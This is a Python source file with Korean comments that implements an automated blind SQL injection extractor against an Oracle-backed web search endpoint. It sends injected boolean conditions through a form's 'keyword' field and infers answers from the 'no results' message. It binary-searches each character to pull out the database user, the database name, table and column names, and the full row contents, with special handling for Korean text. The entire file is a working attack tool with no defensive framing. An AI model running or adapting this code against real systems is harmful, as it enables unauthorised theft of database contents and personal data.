import requests
import init
import LimitEnum

# LENGTH 반환 
def Int_Return(query,max):
    min = 1
    while min < max:
        avg=int((min+max)/2)
        attackquery = init.base_query.format(query.format(avg))
        init.data['keyword'] = attackquery
        res = requests.post(
            url=init.url,
            headers=init.header,
            data=init.data
        );
        if '권한이 없습니다.' in res.text:
            print("권한이 없습니다.\nCookie와 csrf값을 변경해주세요.");
        else:
            if '결과가 없습니다.' in res.text:
                max=avg
            else:
                min=avg+1
    return min
 
def KO_Return(query):
    attackquery = init.base_query.format(query.format('2'))
    init.data['keyword'] = attackquery
    res = requests.post(
        url=init.url,
        headers=init.header,
        data=init.data
    );
    if '권한이 없습니다.' in res.text:
        print("권한이 없습니다.\nCookie와 csrf값을 변경해주세요.");
    else:
        if '결과가 없습니다.' in res.text:
            return False
        else:
            return True
 
# ASCII코드 2진탐색 -> 문자로 치환 -> 문자열반환 
def ASCII_List_Return(query,length):
    data_list = []
    for i in range(1,length+1):
        min = 1
        max = LimitEnum.ORACLE.ASCII_CODE_MAX.value
        while min < max:
            avg=int((min+max)/2)
            attackquery = init.base_query.format(query.format(i,avg))
            init.data['keyword'] = attackquery
            res = requests.post(
                url=init.url,
                headers=init.header,
                data=init.data
            );
            if '권한이 없습니다.' in res.text:
                print("권한이 없습니다.\nCookie와 csrf값을 변경해주세요.");
            else:
                if '결과가 없습니다.' in res.text:
                    max=avg
                else:
                    min=avg+1
        # 한글 체크
        if min == LimitEnum.ORACLE.ASCII_CODE_MAX.value:
            data_list.append('?')
        else:
            data_list.append(chr(min))
    result = "";
    for char in data_list:
        result+=char
    return result
 
def KO_ASCII_Return(query):
    min = 1
    max = LimitEnum.ORACLE.ASCII_CODE_MAX.value
    while min < max:
        avg=int((min+max)/2)
        attackquery = init.base_query.format(query.format(avg))
        init.data['keyword'] = attackquery
        res = requests.post(
            url=init.url,
            headers=init.header,
            data=init.data
        );
        if '권한이 없습니다.' in res.text:
            print("권한이 없습니다.\nCookie와 csrf값을 변경해주세요.");
        else:
            if '결과가 없습니다.' in res.text:
                max=avg
            else:
                min=avg+1
    # 한글 체크
    return chr(min)

# 유저 정보
def Get_User_Name(sql_injection_print):
    query = "(SELECT length(user) FROM dual) > {}"
    user_length = Int_Return(query,LimitEnum.ORACLE.USER_NAME_SIZE_MAX.value)
    sql_injection_print("USER length : {}".format(user_length))
    query = "(SELECT ASCII(SUBSTR(user,{},1)) from dual) > {}"
    user_name = ASCII_List_Return(query,user_length)
    return user_name;
 
# 데이터베이스 정보
def Get_DB_Name(sql_injection_print):
    query = "(SELECT length(NAME) FROM v$database) > {}"
    database_length = Int_Return(query,LimitEnum.ORACLE.DB_NAME_SIZE_MAX.value)
    sql_injection_print("database length : {}".format(database_length))
    query = "(SELECT ASCII(SUBSTR(NAME,{},1)) FROM v$database) > {}"
    database_name = ASCII_List_Return(query, database_length)
    return database_name

# 테이블 정보
def Get_Table_List(sql_injection_print):
    query = "(SELECT count(table_name) from USER_TABLES) > {}"
    table_count = Int_Return(query,LimitEnum.ORACLE.TABLE_COUNT_MAX.value)
    sql_injection_print("테이블 총 갯수 : {}".format(table_count))
    table_name_list = []
    for index in range(table_count):
        query = "(SELECT LENGTH(table_name) from (select table_name, rownum rnum from 
USER_TABLES) where rnum = "+str(index+1)+") > {}"
        table_length = (Int_Return(query,LimitEnum.ORACLE.TABLE_NAME_SIZE_MAX.value))
        sql_injection_print("{}번째 Table length : {}".format(index, table_length))
        query = "(SELECT ASCII(SUBSTR(table_name,{},1)) from (select table_name, rownum rnum 
from USER_TABLES) where rnum = "+str(index+1)+") > {}"
        table_name = ASCII_List_Return(query,table_length)
        sql_injection_print("Table[{}] : {}".format(index,table_name)) # 5
        table_name_list.append(table_name)
    return table_name_list
 
# 모든 컬럼 정보
def Get_Column_List(table_name_list,sql_injection_print):
    table_list = []
    for table_name in table_name_list:
        query = "(SELECT count(column_name) from user_tab_columns where table_name = 
'"+table_name+"') > {}"
        table_column_count = Int_Return(query,LimitEnum.ORACLE.COLUMN_COUNT_MAX.value)
        column_list = []
        for index in range(table_column_count):
            query = "(SELECT LENGTH(column_name) from (select column_name, rownum rnum 
from user_tab_columns where table_name = '"+table_name+"') where rnum 
= "+str(index+1)+") > {}"
            column_length = Int_Return(query,LimitEnum.ORACLE.COLUMN_NAME_SIZE_MAX.value)
            query = "(SELECT ASCII(SUBSTR(column_name,{},1)) from (select column_name, rownum 
rnum from user_tab_columns where table_name = '"+table_name+"') where 
rnum = "+str(index+1)+") > {}"
            column = {
                "column_name" : ASCII_List_Return(query,column_length),
                "row_data_list" : None
            }
            sql_injection_print("[{}]Table의 컬럼[{}] : {}".format(table_name, 
index ,column['column_name'])) # 5
            column_list.append(column)
        table = {
            "table_name" : table_name,
            "column_list" : column_list
        };
        table_list.append(table)
    
    return table_list
 
# 컬럼의 오래된 데이터 삭제 후 재등록
def Table_List_Refresh(table_list, search_table_list):
    for search_table in search_table_list:
        for table in table_list:
            if table['table_name'] == search_table['table_name']:
                table_list.remove(table)
                table_list.append(search_table)
                break
    return table_list

#모든 데이터
def Get_Data_List(sql_injection_print,table_name_list,table_list):
    for table_name in table_name_list:
        for table in table_list:
            if table['table_name'] == table_name:
                select_table = table
                sql_injection_print("select_table : {}".format(select_table))
                for column in select_table['column_list']:
                    query = "(SELECT count("+column['column_name']+") from 
"+select_table['table_name']+") > {}"
                    row_count = Int_Return(query,LimitEnum.ORACLE.ROW_COUNT_MAX.value)
                    sql_injection_print("select_column : {}, size: 
{}".format(column['column_name'],row_count))
                    row_data_list = []
                    
                    for index in range(74,row_count):
                        query = "(SELECT LENGTH("+column['column_name']+") from (select 
"+column['column_name']+", rownum rnum from 
"+select_table['table_name']+") where rnum = "+str(index+1)+") 
> {}"
                        row_length = 
Int_Return(query,LimitEnum.ORACLE.ROW_LENGTH_MAX.value)
                        print("row_length : {}".format(row_length));

                        #한글
                        query = "(SELECT LENGTHB(SUBSTR("+column['column_name']+",1,1)) from 
(select "+column['column_name']+", rownum rnum from 
"+select_table['table_name']+") where rnum = "+str(index+1)+") 
> {}"
                        if KO_Return(query):
                            kbyte=0
                            mbyte=0
                            result = "";
                            for row_index in range(1,row_length+1):
                                query = "(SELECT 
LENGTHB(SUBSTR("+column['column_name']+","+str(row_in
dex)+",1)) from (select "+column['column_name']+", 
rownum rnum from "+select_table['table_name']+") where 
rnum = "+str(index+1)+") > {}"
                                if KO_Return(query):
                                    hex_list = "";
                                    for utf_index in range(1,7):
                                        query = "(SELECT ASCII(SUBSTR(RAWTOHEX
("+column['column_name']
+"),"+str((kbyte*6)+utf_index+(mbyte))+",1)) from 
(select "+column['column_name']+", rownum rnum 
from "+select_table['table_name']+") where rnum = 
"+str(index+1)+") > {}"
                                        hex_list += KO_ASCII_Return(query)
                                    kbyte+=1
                                    result += hex_to_korean(hex_list);
                                else:
                                    query = "(SELECT ASCII(SUBSTR("+column['column_name']
+","+str(row_index)+",1)) from (select 
"+column['column_name']+", rownum rnum from 
"+select_table['table_name']+") where rnum = 
"+str(index+1)+") > {}"
                                    mbyte+=2
                                    result += KO_ASCII_Return(query)
                                print("ko_result : {}".format(result));
                            row = {
                                "row_data" : result,
                                "row_num" : str(index+1)
                            }
                            print("ko_result : {}".format(row));
                            row_data_list.append(row)
                        else:
                            query = "(SELECT ASCII(SUBSTR("+column['column_name']+",{},1)) from 
(select "+column['column_name']+", rownum rnum from 
"+select_table['table_name']+") where rnum = 
"+str(index+1)+") > {}"
                            row = {
                                "row_data" : ASCII_List_Return(query, row_length),
                                "row_num" : str(index+1)
                            }
                            sql_injection_print("[{}]Table [{}]Column - column_row_search[{}] : 
row_data={}, row_num={}".format(select_table
['table_name'],column['column_name'],index, 
row['row_data'],row['row_num']))
                            row_data_list.append(row)
                    column['row_data_list']=row_data_list
    return table_list

def hex_to_korean(hex_string):
    byte_data = bytes.fromhex(hex_string)
    try:
        korean_text = byte_data.decode('utf-8')
        return korean_text
    except UnicodeDecodeError:
        print("Error: Invalid hex input for Korean characters.")
        return None